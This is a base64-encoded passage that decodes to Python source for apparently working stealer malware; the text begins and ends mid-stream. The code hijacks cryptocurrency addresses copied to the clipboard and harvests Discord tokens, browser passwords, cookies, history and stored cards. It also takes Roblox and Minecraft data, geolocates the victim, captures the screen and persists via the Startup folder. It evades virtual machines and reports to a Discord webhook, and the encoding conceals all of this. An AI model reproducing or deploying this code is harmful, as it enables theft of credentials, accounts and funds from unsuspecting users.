uY2hlY2tfb3V0cHV0KHNoMiwgY3JlYXRpb25mbGFncz1mbGFnKS5kZWNvZGUoKS5yc3RyaXAoKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgIHcxbmszM3kgPSAiTi9BIgogICAgICAgIHRyeToKICAgICAgICAgICAgdzFudjNyID0gc3VicHJvY2Vzcy5jaGVja19vdXRwdXQoc2gzLCBjcmVhdGlvbmZsYWdzPWZsYWcpLmRlY29kZSgpLnJzdHJpcCgpCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICAgICAgdzFudjNyID0gIk4vQSIKICAgICAgICByZXR1cm4gW3V1aWR3bmR6LCB3MW52M3IsIHcxbmszM3ldCgoKICAgIEBzdGF0aWNtZXRob2QKICAgIGRlZiBuZXRfMWZvKCkgLT4gbGlzdDoKICAgICAgICBpcCwgY2l0eSwgY291bnRyeSwgcmVnaW9uLCBvcmcsIGxvYywgZ29vZ2xlbWFwID0gIk5vbmUiLCAiTm9uZSIsICJOb25lIiwgIk5vbmUiLCAiTm9uZSIsICJOb25lIiwgIk5vbmUiCiAgICAgICAgcmVxID0gaHR0cHguZ2V0KCJodHRwczovL2lwaW5mby5pby9qc29uIikKICAgICAgICBpZiByZXEuc3RhdHVzX2NvZGUgPT0gMjAwOgogICAgICAgICAgICBkYXRhID0gcmVxLmpzb24oKQogICAgICAgICAgICBpcCA9IGRhdGEuZ2V0KCdpcCcpCiAgICAgICAgICAgIGNpdHkgPSBkYXRhLmdldCgnY2l0eScpCiAgICAgICAgICAgIGNvdW50cnkgPSBkYXRhLmdldCgnY291bnRyeScpCiAgICAgICAgICAgIHJlZ2lvbiA9IGRhdGEuZ2V0KCdyZWdpb24nKQogICAgICAgICAgICBvcmcgPSBkYXRhLmdldCgnb3JnJykKICAgICAgICAgICAgbG9jID0gZGF0YS5nZXQoJ2xvYycpCiAgICAgICAgICAgIGdvb2dsZW1hcCA9ICJodHRwczovL3d3dy5nb29nbGUuY29tL21hcHMvc2VhcmNoL2dvb2dsZSttYXArKyIgKyBsb2MKICAgICAgICByZXR1cm4gW2lwLCBjaXR5LCBjb3VudHJ5LCByZWdpb24sIG9yZywgbG9jLCBnb29nbGVtYXBdCgogICAgQHN0YXRpY21ldGhvZAogICAgZGVmIGZldGNoX2NvbmYoZTogc3RyKSAtPiBzdHIgb3IgYm9vbCB8IE5vbmU6CiAgICAgICAgcmV0dXJuIF9fY29uZmlnX18uZ2V0KGUpCgoKCgoKCgoKCgpjbGFzcyBhdXRvX2NvcHlfd2FsbGV0KEZ1bmN0aW9ucyk6CiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgc2VsZi5hZGRyZXNzX3N0M2FsZXIgPSBzZWxmLmZldGNoX2NvbmYoImFkZHJlc3NlX2NyeXB0b19yZXBsYWNlciIpCiAgICAgICAgc2VsZi5hZGRyZXNzX2J0YyA9IHNlbGYuZmV0Y2hfY29uZigiYWRkcmVzc2VfYnRjIikKICAgICAgICBzZWxmLmFkZHJlc3NfZXRoID0gc2VsZi5mZXRjaF9jb25mKCJhZGRyZXNzZV9ldGgiKQogICAgICAgIHNlbGYuYWRkcmVzc194Y2hhaW4gPSBzZWxmLmZldGNoX2NvbmYoImFkZHJlc3NlX3hjaGFpbiIpCiAgICAgICAgc2VsZi5hZGRyZXNzX3BjaGFpbiA9IHNlbGYuZmV0Y2hfY29uZigiYWRkcmVzc2VfcGNoYWluIikKICAgICAgICBzZWxmLmFkZHJlc3NfY2NoYWluID0gc2VsZi5mZXRjaF9jb25mKCJhZGRyZXNzZV9jY2hhaW4iKQogICAgICAgIHNlbGYuYWRkcmVzc19tb25lcm8gPSBzZWxmLmZldGNoX2NvbmYoImFkZHJlc3NlX21vbmVybyIpCiAgICAgICAgc2VsZi5hZGRyZXNzX2FkYSA9IHNlbGYuZmV0Y2hfY29uZigiYWRkcmVzc2VfYWRhIikKICAgICAgICBzZWxmLmFkZHJlc3NfZGFzaCA9IHNlbGYuZmV0Y2hfY29uZigiYWRkcmVzc2VfZGFzaCIpCgoKICAgIGRlZiBhZGRyZXNzX3N3YXAoc2VsZik6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBjbGlwYm9hcmRfZGF0YSA9IHB5cGVyY2xpcC5wYXN0ZSgpCiAgICAgICAgICAgIGlmIHJlLnNlYXJjaCgnXlsxM11bYS1rbS16QS1ISi1OUC1aMS05XXsyNSwzNH0kJywgY2xpcGJvYXJkX2RhdGEpOgogICAgICAgICAgICAgICAgaWYgY2xpcGJvYXJkX2RhdGEgbm90IGluIFtzZWxmLmFkZHJlc3NfYnRjLCBzZWxmLmFkZHJlc3NfZXRoLCBzZWxmLmFkZHJlc3NfeGNoYWluLCBzZWxmLmFkZHJlc3NfcGNoYWluLCBzZWxmLmFkZHJlc3NfY2NoYWluLCBzZWxmLmFkZHJlc3NfbW9uZXJvLCBzZWxmLmFkZHJlc3NfYWRhLCBzZWxmLmFkZHJlc3NfZGFzaF06CiAgICAgICAgICAgICAgICAgICAgaWYgc2VsZi5hZGRyZXNzX2J0YyAhPSAibm9uZSI6CiAgICAgICAgICAgICAgICAgICAgICAgIHB5cGVyY2xpcC5jb3B5KHNlbGYuYWRkcmVzc19idGMpCiAgICAgICAgICAgICAgICAgICAgICAgIHB5cGVyY2xpcC5wYXN0ZSgpCiAgICAgICAgICAgIAogICAgICAgICAgICBpZiByZS5zZWFyY2goJ14weFthLWZBLUYwLTldezQwfSQnLCBjbGlwYm9hcmRfZGF0YSk6CiAgICAgICAgICAgICAgICBweXBlcmNsaXAuY29weShzZWxmLmFkZHJlc3NfZXRoKQogICAgICAgICAgICAgICAgcHlwZXJjbGlwLnBhc3RlKCkKICAgICAgICAgICAgICAgIAogICAgICAgICAgICBpZiByZS5zZWFyY2goJ14oW1hdfFthLWttLXpBLUhKLU5QLVoxLTldezM2LDcyfSktW2EtekEtWl17MSw4M30xW3FwenJ5OXg4Z2YydHZkdzBzM2puNTRraGNlNm11YTdsXXszOH0kJywgY2xpcGJvYXJkX2RhdGEpOgogICAgICAgICAgICAgICAgaWYgc2VsZi5hZGRyZXNzX3hjaGFpbiAhPSAibm9uZSI6CiAgICAgICAgICAgICAgICAgICAgaWYgY2xpcGJvYXJkX2RhdGEgbm90IGluIFtzZWxmLmFkZHJlc3NfYnRjLCBzZWxmLmFkZHJlc3NfZXRoLCBzZWxmLmFkZHJlc3NfeGNoYWluLCBzZWxmLmFkZHJlc3NfcGNoYWluLCBzZWxmLmFkZHJlc3NfY2NoYWluLCBzZWxmLmFkZHJlc3NfbW9uZXJvLCBzZWxmLmFkZHJlc3NfYWRhLCBzZWxmLmFkZHJlc3NfZGFzaF06CiAgICAgICAgICAgICAgICAgICAgICAgIHB5cGVyY2xpcC5jb3B5KHNlbGYuYWRkcmVzc194Y2hhaW4pCiAgICAgICAgICAgICAgICAgICAgICAgIHB5cGVyY2xpcC5wYXN0ZSgpCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIAogICAgICAgICAgICBpZiByZS5zZWFyY2goJ14oW1BdfFthLWttLXpBLUhKLU5QLVoxLTldezM2LDcyfSktW2EtekEtWl17MSw4M30xW3FwenJ5OXg4Z2YydHZkdzBzM2puNTRraGNlNm11YTdsXXszOH0kJywgY2xpcGJvYXJkX2RhdGEpOgogICAgICAgICAgICAgICAgaWYgc2VsZi5hZGRyZXNzX3BjaGFpbiAhPSAibm9uZSI6CiAgICAgICAgICAgICAgICAgICAgaWYgY2xpcGJvYXJkX2RhdGEgbm90IGluIFtzZWxmLmFkZHJlc3NfYnRjLCBzZWxmLmFkZHJlc3NfZXRoLCBzZWxmLmFkZHJlc3NfeGNoYWluLCBzZWxmLmFkZHJlc3NfcGNoYWluLCBzZWxmLmFkZHJlc3NfY2NoYWluLCBzZWxmLmFkZHJlc3NfbW9uZXJvLCBzZWxmLmFkZHJlc3NfYWRhLCBzZWxmLmFkZHJlc3NfZGFzaF06CiAgICAgICAgICAgICAgICAgICAgICAgIHB5cGVyY2xpcC5jb3B5KHNlbGYuYWRkcmVzc19wY2hhaW4pCiAgICAgICAgICAgICAgICAgICAgICAgIHB5cGVyY2xpcC5wYXN0ZSgpCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIAogICAgICAgICAgICBpZiByZS5zZWFyY2goJ14oW0NdfFthLWttLXpBLUhKLU5QLVoxLTldezM2LDcyfSktW2EtekEtWl17MSw4M30xW3FwenJ5OXg4Z2YydHZkdzBzM2puNTRraGNlNm11YTdsXXszOH0kJywgY2xpcGJvYXJkX2RhdGEpOgogICAgICAgICAgICAgICAgaWYgc2VsZi5hZGRyZXNzX2NjaGFpbiAhPSAibm9uZSI6CiAgICAgICAgICAgICAgICAgICAgaWYgY2xpcGJvYXJkX2RhdGEgbm90IGluIFtzZWxmLmFkZHJlc3NfYnRjLCBzZWxmLmFkZHJlc3NfZXRoLCBzZWxmLmFkZHJlc3NfeGNoYWluLCBzZWxmLmFkZHJlc3NfcGNoYWluLCBzZWxmLmFkZHJlc3NfY2NoYWluLCBzZWxmLmFkZHJlc3NfbW9uZXJvLCBzZWxmLmFkZHJlc3NfYWRhLCBzZWxmLmFkZHJlc3NfZGFzaF06CiAgICAgICAgICAgICAgICAgICAgICAgIHB5cGVyY2xpcC5jb3B5KHNlbGYuYWRkcmVzc19jY2hhaW4pCiAgICAgICAgICAgICAgICAgICAgICAgIHB5cGVyY2xpcC5wYXN0ZSgpCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIAogICAgICAgICAgICBpZiByZS5zZWFyY2goJ2FkZHIxW2EtejAtOV0rJywgY2xpcGJvYXJkX2RhdGEpOgogICAgICAgICAgICAgICAgICAgIGlmIGNsaXBib2FyZF9kYXRhIG5vdCBpbiBbc2VsZi5hZGRyZXNzX2J0Yywgc2VsZi5hZGRyZXNzX2V0aCwgc2VsZi5hZGRyZXNzX3hjaGFpbiwgc2VsZi5hZGRyZXNzX3BjaGFpbiwgc2VsZi5hZGRyZXNzX2NjaGFpbiwgc2VsZi5hZGRyZXNzX21vbmVybywgc2VsZi5hZGRyZXNzX2FkYSwgc2VsZi5hZGRyZXNzX2Rhc2hdOgogICAgICAgICAgICAgICAgICAgICAgICBweXBlcmNsaXAuY29weShzZWxmLmFkZHJlc3NfYWRhKQogICAgICAgICAgICAgICAgICAgICAgICBweXBlcmNsaXAucGFzdGUoKQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgIGlmIHJlLnNlYXJjaCgnL1hbMS05QS1ISi1OUC1aYS1rbS16XXszM30kL2cnLCBjbGlwYm9hcmRfZGF0YSk6CiAgICAgICAgICAgICAgICBpZiBzZWxmLmFkZHJlc3NfZGFzaCAhPSAibm9uZSI6CiAgICAgICAgICAgICAgICAgICAgaWYgY2xpcGJvYXJkX2RhdGEgbm90IGluIFtzZWxmLmFkZHJlc3NfYnRjLCBzZWxmLmFkZHJlc3NfZXRoLCBzZWxmLmFkZHJlc3NfeGNoYWluLCBzZWxmLmFkZHJlc3NfcGNoYWluLCBzZWxmLmFkZHJlc3NfY2NoYWluLCBzZWxmLmFkZHJlc3NfbW9uZXJvLCBzZWxmLmFkZHJlc3NfYWRhLCBzZWxmLmFkZHJlc3NfZGFzaF06CiAgICAgICAgICAgICAgICAgICAgICAgIHB5cGVyY2xpcC5jb3B5KHNlbGYuYWRkcmVzc19kYXNoKQogICAgICAgICAgICAgICAgICAgICAgICBweXBlcmNsaXAucGFzdGUoKQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgIGlmIHJlLnNlYXJjaCgnLzRbMC05QUJdWzEtOUEtSEotTlAtWmEta20tel17OTN9JC9nJywgY2xpcGJvYXJkX2RhdGEpOgogICAgICAgICAgICAgICAgaWYgc2VsZi5hZGRyZXNzX21vbmVybyAhPSAibm9uZSI6CiAgICAgICAgICAgICAgICAgICAgaWYgY2xpcGJvYXJkX2RhdGEgbm90IGluIFtzZWxmLmFkZHJlc3NfYnRjLCBzZWxmLmFkZHJlc3NfZXRoLCBzZWxmLmFkZHJlc3NfeGNoYWluLCBzZWxmLmFkZHJlc3NfcGNoYWluLCBzZWxmLmFkZHJlc3NfY2NoYWluLCBzZWxmLmFkZHJlc3NfbW9uZXJvLCBzZWxmLmFkZHJlc3NfYWRhLCBzZWxmLmFkZHJlc3NfZGFzaF06CiAgICAgICAgICAgICAgICAgICAgICAgIHB5cGVyY2xpcC5jb3B5KHNlbGYuYWRkcmVzc19tb25lcm8pCiAgICAgICAgICAgICAgICAgICAgICAgIHB5cGVyY2xpcC5wYXN0ZSgpCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIAogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgZGF0YSA9IE5vbmUKICAgICAgICAgICAgCiAgICAgICAgICAgIAogICAgZGVmIGxvb3BfdGhyb3VnaChzZWxmKToKICAgICAgICAKICAgICAgICB3aGlsZSBUcnVlOgogICAgICAgICAgICBzZWxmLmFkZHJlc3Nfc3dhcCgpCiAgICAgCiAgICBkZWYgcnVuKHNlbGYpOgogICAgICAgIGlmIHNlbGYuYWRkcmVzc19zdDNhbGVyID09ICJ5ZXMiOgogICAgICAgICAgICBzZWxmLmxvb3BfdGhyb3VnaCgpCgoKY2xhc3MgYmNfaW5pdGlhbF9mdW5jKEZ1bmN0aW9ucyk6CiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgCiAgICAgICAgc2VsZi5kc2NhcDEgPSAiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdjkvdXNlcnMvQG1lIgoKICAgICAgICBzZWxmLmRpc2NvcmRfd2ViaG9vayA9IHNlbGYuZmV0Y2hfY29uZigneW91cndlYmhvb2t1cmwnKQoKICAgICAgICBzZWxmLmhpZGUgPSBzZWxmLmZldGNoX2NvbmYoImhpZGUiKQoKICAgICAgICBzZWxmLnBpbmd0eXBlID0gc2VsZi5mZXRjaF9jb25mKCJwaW5ndHlwZSIpCgogICAgICAgIHNlbGYucGluZ29ucnVuID0gc2VsZi5mZXRjaF9jb25mKCJwaW5nIikKICAgICAgICAKICAgICAgICBzZWxmLmJhc2V1cmwgPSAiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdjkvdXNlcnMvQG1lIgoKICAgICAgICBzZWxmLnN0YXJ0dXBleGUgPSBzZWxmLmZldGNoX2NvbmYoInN0YXJ0dXAiKQogICAgICAgIAogICAgICAgIHNlbGYuZmFrZV9lcnJvciA9IHNlbGYuZmV0Y2hfY29uZigiZmFrZV9lcnJvciIpCgogICAgICAgIHNlbGYuYXBwZGF0YSA9IG9zLmdldGVudigibG9jYWxhcHBkYXRhIikKCiAgICAgICAgc2VsZi5yb2FtaW5nID0gb3MuZ2V0ZW52KCJhcHBkYXRhIikKICAgICAgICAKICAgICAgICBzZWxmLmNocm1tdXNlcmR0dCA9IG50cGF0aC5qb2luKHNlbGYuYXBwZGF0YSwgJ0dvb2dsZScsICdDaHJvbWUnLCAnVXNlciBEYXRhJykKCiAgICAgICAgc2VsZi5kaXIsIHNlbGYudGVtcCA9IG1rZHRlbXAoKSwgZ2V0dGVtcGRpcigpCgogICAgICAgIGluZiwgbmV0ID0gc2VsZi5zeXNfMWZvKCksIHNlbGYubmV0XzFmbygpCgogICAgICAgIHNlbGYudXVpZHduZHosIHNlbGYudzFudjNyLCBzZWxmLncxbmszM3kgPSBpbmZbMF0sIGluZlsxXSwgaW5mWzJdCgogICAgICAgIHNlbGYuaXAsIHNlbGYuY2l0eSwgc2VsZi5jb3VudHJ5LCBzZWxmLnJlZ2lvbiwgc2VsZi5vcmcsIHNlbGYubG9jLCBzZWxmLmdvb2dsZW1hcCA9IG5ldFswXSwgbmV0WzFdLCBuZXRbMl0sIG5ldFszXSwgbmV0WzRdLCBuZXRbNV0sIG5ldFs2XQoKICAgICAgICBzZWxmLnNydHVwbDBjID0gbnRwYXRoLmpvaW4oc2VsZi5yb2FtaW5nLCAnTWljcm9zb2Z0JywgJ1dpbmRvd3MnLCAnU3RhcnQgTWVudScsICdQcm9ncmFtcycsICdTdGFydHVwJykKCiAgICAgICAgc2VsZi5yZWdleF93ZWJob29rX2RzYyA9ICIucnUvcmVsYXkiCgogICAgICAgIHNlbGYuY2hybXJneCA9IHJlLmNvbXBpbGUocicoXnByb2ZpbGVcc1xkKil8ZGVmYXVsdHwoZ3Vlc3QgcHJvZmlsZSQpJywgcmUuSUdOT1JFQ0FTRSB8IHJlLk1VTFRJTElORSk7CiAgICAgICAgCiAgICAgICAgc2VsZi5iYXNldXJsID0gImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3Y5L3VzZXJzL0BtZSIKCiAgICAgICAgc2VsZi5yZWdleCA9IGNsZWFyX3JlZwoKICAgICAgICBzZWxmLmVuY3J5cHRlZF9yZWdleCA9IHIiZFF3NHc5V2dYY1E6W15cIl0qIgoKICAgICAgICBzZWxmLnRva2VucyA9IFtdCgogICAgICAgIHNlbGYuYmNfaWQgPSBbXQoKICAgICAgICBzZWxmLnNlcCA9IG9zLnNlcDsKCiAgICAgICAgc2VsZi5yb2Jsb3hjb29raWVzID0gW107CgogICAgICAgIHNlbGYuY2hyb21lX2tleSA9IHNlbGYuZ3RtazN5KG50cGF0aC5qb2luKHNlbGYuY2hybW11c2VyZHR0LCAiTG9jYWwgU3RhdGUiKSk7CgoKICAgICAgICBvcy5tYWtlZGlycyhzZWxmLmRpciwgZXhpc3Rfb2s9VHJ1ZSk7CgoKICAgIAoKCiAgICBkZWYgZXJyb3JfcmVtb3RlKHNlbGY6IHN0cikgLT4gc3RyOgogICAgICAgIGlmIHNlbGYuZmFrZV9lcnJvciA9PSAieWVzIjoKICAgICAgICAgICAgY3R5cGVzLndpbmRsbC51c2VyMzIuTWVzc2FnZUJveFcoTm9uZSwgJ0Vycm9yIGNvZGU6IFdpbmRvd3NfMHg5ODg5NThcblNvbWV0aGluZyBnb25lIHdyb25nLicsICdGYXRhbCBFcnJvcicsIDApCgogICAgZGVmIHBpbmdfb25fcnVubmluZyhzZWxmOiBzdHIpIC0+IHN0cjoKICAgICAgICBwaW5nMSA9IHsKICAgICAgICAgICAgJ2F2YXRhcl91cmwnOiAnaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXZhdGFycy8yMjg1NDkxMTM1ODE1MzUyMzUvNDMwZjgxZWFkNjdlYWZmY2FmZmJiNmU3YjBhZjI5MjcucG5nJywKICAgICAgICAgICAgJ2NvbnRlbnQnOiAiQGV2ZXJ5b25lIgogICAgICAgICAgICB9CiAgICAgICAgcGluZzIgPSB7CiAgICAgICAgICAgICdhdmF0YXJfdXJsJzogJ2h0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F2YXRhcnMvMjI4NTQ5MTEzNTgxNTM1MjM1LzQzMGY4MWVhZDY3ZWFmZmNhZmZiYjZlN2IwYWYyOTI3LnBuZycsCiAgICAgICAgICAgICdjb250ZW50JzogIkBoZXJlIgogICAgICAgICAgICB9CiAgICAgICAgaWYgc2VsZi5waW5nb25ydW4gPT0gInllcyI6CiAgICAgICAgICAgIGlmIHNlbGYucmVnZXhfd2ViaG9va19kc2MgaW4gc2VsZi5kaXNjb3JkX3dlYmhvb2s6CiAgICAgICAgICAgICAgICBpZiBzZWxmLnBpbmd0eXBlID09ICJAZXZlcnlvbmUiIG9yIHNlbGYucGluZ3R5cGUgPT0gImV2ZXJ5b25lIjoKICAgICAgICAgICAgICAgICAgICBodHRweC5wb3N0KHNlbGYuZGlzY29yZF93ZWJob29rLCBqc29uPXBpbmcxKQogICAgICAgICAgICBpZiBzZWxmLnBpbmd0eXBlID09ICJAaGVyZSIgb3Igc2VsZi5waW5ndHlwZSA9PSAiaGVyZSI6CiAgICAgICAgICAgICAgICBpZiBzZWxmLnJlZ2V4X3dlYmhvb2tfZHNjIGluIHNlbGYuZGlzY29yZF93ZWJob29rIDoKICAgICAgICAgICAgICAgICAgICBodHRweC5wb3N0KHNlbGYuZGlzY29yZF93ZWJob29rLCBqc29uPXBpbmcyKQoKCgogICAgZGVmIHN0YXJ0dXBrZWt3KHNlbGY6IHN0cikgLT4gc3RyOgogICAgICAgIGlmIHNlbGYuc3RhcnR1cGV4ZSA9PSAieWVzIjoKICAgICAgICAgICAgc3RhcnR1cF9wYXRoID0gb3MuZ2V0ZW52KCJhcHBkYXRhIikgKyAiXFxNaWNyb3NvZnRcXFdpbmRvd3NcXFN0YXJ0IE1lbnVcXFByb2dyYW1zXFxTdGFydHVwXFwiCiAgICAgICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKHN0YXJ0dXBfcGF0aCArIGFyZ3ZbMF0pOgogICAgICAgICAgICAgICAgb3MucmVtb3ZlKHN0YXJ0dXBfcGF0aCArIGFyZ3ZbMF0pCiAgICAgICAgICAgICAgICBjb3B5Mihhcmd2WzBdLCBzdGFydHVwX3BhdGgpCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBjb3B5Mihhcmd2WzBdLCBzdGFydHVwX3BhdGgpCgoKICAgICAgICAgICAgICAgIAoKCgoKICAgIGRlZiBiY19leGl0X3RoaXMoc2VsZik6CiAgICAgICAgc2h1dGlsLnJtdHJlZShzZWxmLmRpciwgaWdub3JlX2Vycm9ycz1UcnVlKQogICAgICAgIG9zLl9leGl0KDApCgogICAgZGVmIGV4dHJhY3RfdHJ5KGZ1bmMpOgogICAgICAgICcnJ0RlY29yYXRvciB0byBzYWZlbHkgY2F0Y2ggYW5kIGlnbm9yZSBleGNlcHRpb25zJycnCiAgICAgICAgZGVmIHdyYXBwZXIoKmFyZ3MsICoqa3dhcmdzKToKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgZnVuYygqYXJncywgKiprd2FyZ3MpCiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgICAgICBwYXNzCiAgICAgICAgcmV0dXJuIHdyYXBwZXIKCiAgICBhc3luYyBkZWYgaW5pdChzZWxmKToKICAgICAgICBzZWxmLmJyb3dzZXJzID0gewogICAgICAgICAgICAnYW1pZ28nOiBzZWxmLmFwcGRhdGEgKyAnXFxBbWlnb1xcVXNlciBEYXRhJywKICAgICAgICAgICAgJ3RvcmNoJzogc2VsZi5hcHBkYXRhICsgJ1xcVG9yY2hcXFVzZXIgRGF0YScsCiAgICAgICAgICAgICdrb21ldGEnOiBzZWxmLmFwcGRhdGEgKyAnXFxLb21ldGFcXFVzZXIgRGF0YScsCiAgICAgICAgICAgICdvcmJpdHVtJzogc2VsZi5hcHBkYXRhICsgJ1xcT3JiaXR1bVxcVXNlciBEYXRhJywKICAgICAgICAgICAgJ2NlbnQtYnJvd3Nlcic6IHNlbGYuYXBwZGF0YSArICdcXENlbnRCcm93c2VyXFxVc2VyIERhdGEnLAogICAgICAgICAgICAnN3N0YXInOiBzZWxmLmFwcGRhdGEgKyAnXFw3U3RhclxcN1N0YXJcXFVzZXIgRGF0YScsCiAgICAgICAgICAgICdzcHV0bmlrJzogc2VsZi5hcHBkYXRhICsgJ1xcU3B1dG5pa1xcU3B1dG5pa1xcVXNlciBEYXRhJywKICAgICAgICAgICAgJ3ZpdmFsZGknOiBzZWxmLmFwcGRhdGEgKyAnXFxWaXZhbGRpXFxVc2VyIERhdGEnLAogICAgICAgICAgICAnZ29vZ2xlLWNocm9tZS1zeHMnOiBzZWxmLmFwcGRhdGEgKyAnXFxHb29nbGVcXENocm9tZSBTeFNcXFVzZXIgRGF0YScsCiAgICAgICAgICAgICdnb29nbGUtY2hyb21lJzogc2VsZi5hcHBkYXRhICsgJ1xcR29vZ2xlXFxDaHJvbWVcXFVzZXIgRGF0YScsCiAgICAgICAgICAgICdlcGljLXByaXZhY3ktYnJvd3Nlcic6IHNlbGYuYXBwZGF0YSArICdcXEVwaWMgUHJpdmFjeSBCcm93c2VyXFxVc2VyIERhdGEnLAogICAgICAgICAgICAnbWljcm9zb2Z0LWVkZ2UnOiBzZWxmLmFwcGRhdGEgKyAnXFxNaWNyb3NvZnRcXEVkZ2VcXFVzZXIgRGF0YScsCiAgICAgICAgICAgICd1cmFuJzogc2VsZi5hcHBkYXRhICsgJ1xcdUNvek1lZGlhXFxVcmFuXFxVc2VyIERhdGEnLAogICAgICAgICAgICAneWFuZGV4Jzogc2VsZi5hcHBkYXRhICsgJ1xcWWFuZGV4XFxZYW5kZXhCcm93c2VyXFxVc2VyIERhdGEnLAogICAgICAgICAgICAnYnJhdmUnOiBzZWxmLmFwcGRhdGEgKyAnXFxCcmF2ZVNvZnR3YXJlXFxCcmF2ZS1Ccm93c2VyXFxVc2VyIERhdGEnLAogICAgICAgICAgICAnaXJpZGl1bSc6IHNlbGYuYXBwZGF0YSArICdcXElyaWRpdW1cXFVzZXIgRGF0YScsCiAgICAgICAgICAgICdlZGdlJzogc2VsZi5hcHBkYXRhICsgIlxcTWljcm9zb2Z0XFxFZGdlXFxVc2VyIERhdGEiCgogICAgICAgIH0gICAgICAgIAogICAgICAgIHNlbGYucHJvZmlsZXMgPSBbCiAgICAgICAgICAgICdEZWZhdWx0JywKICAgICAgICAgICAgJ1Byb2ZpbGUgMScsCiAgICAgICAgICAgICdQcm9maWxlIDInLAogICAgICAgICAgICAnUHJvZmlsZSAzJywKICAgICAgICAgICAgJ1Byb2ZpbGUgNCcsCiAgICAgICAgICAgICdQcm9maWxlIDUnLAogICAgICAgIF0KCiAgICAgICAgaWYgc2VsZi5kaXNjb3JkX3dlYmhvb2sgPT0gIiIgb3Igc2VsZi5kaXNjb3JkX3dlYmhvb2sgPT0gIlx4NTdFQkhPT0tfSEVSRSI6CiAgICAgICAgICAgIHNlbGYuYmNfZXhpdF90aGlzKCkKICAgICAgICAgICAgCiAgICAgICAgc2VsZi5lcnJvcl9yZW1vdGUoKQogICAgICAgIHNlbGYuc3RhcnR1cGtla3coKQoKICAgICAgICBpZiBzZWxmLmZldGNoX2NvbmYoJ2RidWdraWxsZXInKSBhbmQgTm9EZWJ1Z2coKS5pblZNIGlzIFRydWU6CiAgICAgICAgICAgIHNlbGYuYmNfZXhpdF90aGlzKCkKICAgICAgICBhd2FpdCBzZWxmLmJ5cGFzc19idHRkc2MoKQogICAgICAgIGF3YWl0IHNlbGYuYnlwYXNzX3Rva2VucHJ0Y3QoKQoKICAgICAgICBmdW5jdGlvbl9saXN0ID0gW3NlbGYuc3RlYWxfc2NyZWVuLCBzZWxmLnN5c3RlbV9pbmZvcm1hdGlvbnMsIHNlbGYuc3RlYWxfdG9rZW4sIHNlbGYuZ3JhYmJfbWMsIHNlbGYuZ3JhYmJfcm9ibG94XQoKCiAgICAgICAgaWYgc2VsZi5mZXRjaF9jb25mKCdraWxsX2Rpc2NvcmRfcHJvY2VzcycpOgoKICAgICAgICAgICAgYXdhaXQgc2VsZi5raWxsX3Byb2Nlc3NfaWQoKQoKCgogICAgICAgIG9zLm1ha2VkaXJzKG50cGF0aC5qb2luKHNlbGYuZGlyLCAnQnJvd3NlcnMnKSwgZXhpc3Rfb2s9VHJ1ZSkKICAgICAgICBmb3IgbmFtZSwgcGF0aCBpbiBzZWxmLmJyb3dzZXJzLml0ZW1zKCk6CiAgICAgICAgICAgIGlmIG5vdCBvcy5wYXRoLmlzZGlyKHBhdGgpOgogICAgICAgICAgICAgICAgY29udGludWUKCiAgICAgICAgICAgIHNlbGYubWFzdGVya2V5ID0gc2VsZi5ndG1rM3kocGF0aCArICdcXExvY2FsIFN0YXRlJykKICAgICAgICAgICAgc2VsZi5mdW5jcyA9IFsKICAgICAgICAgICAgICAgIHNlbGYuc3RlYWxfY29va2llczIsCiAgICAgICAgICAgICAgICBzZWxmLnN0ZWFsX2hpc3RvcnkyLAogICAgICAgICAgICAgICAgc2VsZi5zdGVhbF9wYXNzd29yZHMyLAogICAgICAgICAgICAgICAgc2VsZi5zdGVhbF9jYzIKICAgICAgICAgICAgXQoKICAgICAgICAgICAgZm9yIHByb2ZpbGUgaW4gc2VsZi5wcm9maWxlczoKICAgICAgICAgICAgICAgIGZvciBmdW5jIGluIHNlbGYuZnVuY3M6CiAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICBmdW5jKG5hbWUsIHBhdGgsIHByb2ZpbGUpCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgICAgICAgICBwYXNzCiAgICAgICAgICAgIAogICAgICAgIGlmIG50cGF0aC5leGlzdHMoc2VsZi5jaHJtbXVzZXJkdHQpIGFuZCBzZWxmLmNocm9tZV9rZXkgaXMgbm90IE5vbmU6CiAgICAgICAgICAgIG9zLm1ha2VkaXJzKG50cGF0aC5qb2luKHNlbGYuZGlyLCAnR29vZ2xlJyksIGV4aXN0X29rPVRydWUpCiAgICAgICAgICAgIGZ1bmN0aW9uX2xpc3QuZXh0ZW5kKFtzZWxmLnN0ZWFsX3Bhc3N3b3Jkcywgc2VsZi5zdGVhbF9jb29raWVzLCBzZWxmLnN0ZWFsX2hpc3RvcnldKQoKICAgICAgICBmb3IgZnVuYyBpbiBmdW5jdGlvbl9saXN0OgogICAgICAgICAgICBwcm9jZXNzID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9ZnVuYywgZGFlbW9uPVRydWUpCiAgICAgICAgICAgIHByb2Nlc3Muc3RhcnQoKQogICAgICAgIGZvciB0IGluIHRocmVhZGluZy5lbnVtZXJhdGUoKToKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgdC5qb2luKCkKICAgICAgICAgICAgZXhjZXB0IFJ1bnRpbWVFcnJvcjoKICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgc2VsZi5uYXRpZnl